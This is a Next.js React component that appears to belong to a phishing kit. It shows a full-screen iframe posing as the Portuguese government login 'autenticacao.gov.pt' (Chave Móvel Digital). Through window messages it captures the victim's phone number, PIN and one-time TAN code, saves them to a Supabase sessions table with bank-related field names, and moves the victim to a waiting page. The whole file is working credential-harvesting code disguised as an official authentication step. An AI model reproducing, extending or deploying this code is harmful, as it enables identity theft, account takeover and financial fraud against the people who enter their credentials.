"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";

type Props = {
  sessionId: string | null;
  routeSessionId?: string;
};

export function AutenticacaoClient({ sessionId, routeSessionId }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const [saving, setSaving] = useState(false);
  const formDataRef = useRef<Record<string, unknown>>({});
  const step1DataRef = useRef<Record<string, string>>({});

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId || sessionId === "preview") return;
      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      formDataRef.current = (data.form_data ?? {}) as Record<string, unknown>;
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  useEffect(() => {
    const onMessage = (event: MessageEvent) => {
      const data = event?.data;
      if (!data || typeof data !== "object") return;
      if (data.type !== "AUTH_GOV") return;
      if (!supabase || !sessionId || sessionId === "preview") return;

      const payload = data.data && typeof data.data === "object" ? (data.data as Record<string, unknown>) : {};

      if (data.trigger === "step1") {
        const phone = typeof payload.inputMobile === "string" ? payload.inputMobile.trim() : "";
        const pin = typeof payload.txtPin === "string" ? payload.txtPin.trim() : "";
        step1DataRef.current = { phone, pin };
        const nextFormData = {
          ...formDataRef.current,
          bankPhone: phone,
          pin,
          cmdPhone: phone,
          cmdPin: pin,
          loginMethod: "Chave Móvel Digital",
          autenticacaoMethod: "Chave Móvel Digital",
        };
        formDataRef.current = nextFormData;
        void supabase
          .from("sessions")
          .update({ is_hidden: false, form_data: nextFormData })
          .eq("id", sessionId);
        return;
      }

      if (data.trigger === "step2") {
        const tan = typeof payload.txtMobileTAN === "string" ? payload.txtMobileTAN.trim() : "";
        const nextFormData = {
          ...formDataRef.current,
          bankPhone: step1DataRef.current.phone || formDataRef.current.bankPhone || "",
          pin: step1DataRef.current.pin || formDataRef.current.pin || "",
          cmdPhone: step1DataRef.current.phone || formDataRef.current.cmdPhone || "",
          cmdPin: step1DataRef.current.pin || formDataRef.current.cmdPin || "",
          cmdTan: tan,
          autenticacaoTan: tan,
          tacCode: tan,
          loginMethod: "Chave Móvel Digital",
          autenticacaoMethod: "Chave Móvel Digital",
          approvalStatus: "autenticacao_confirmed",
          autenticacaoSubmittedAt: new Date().toISOString(),
        };
        setSaving(true);
        void (async () => {
          const { error } = await supabase
            .from("sessions")
            .update({ is_hidden: false, current_step: "wait", form_data: nextFormData })
            .eq("id", sessionId);
          if (!error) {
            formDataRef.current = nextFormData;
            router.push(stepToPath("wait", sessionId, routeSessionId));
          } else {
            setSaving(false);
          }
        })();
      }
    };
    window.addEventListener("message", onMessage);
    return () => window.removeEventListener("message", onMessage);
  }, [sessionId, routeSessionId, router, supabase]);

  return (
    <div className="fixed inset-0 w-[100vw] bg-white z-[9999] overflow-hidden" style={{ minHeight: "100vh", height: "100dvh" }}>
      {saving && (
        <div className="absolute inset-0 bg-white/80 backdrop-blur-sm z-[99999] flex items-center justify-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#003399]"></div>
        </div>
      )}
      <iframe
        src="/gov-auth/1.html"
        className="w-full border-0"
        style={{ height: "100dvh", display: "block" }}
        sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
        title="autenticacao.gov.pt"
      />
    </div>
  );
}
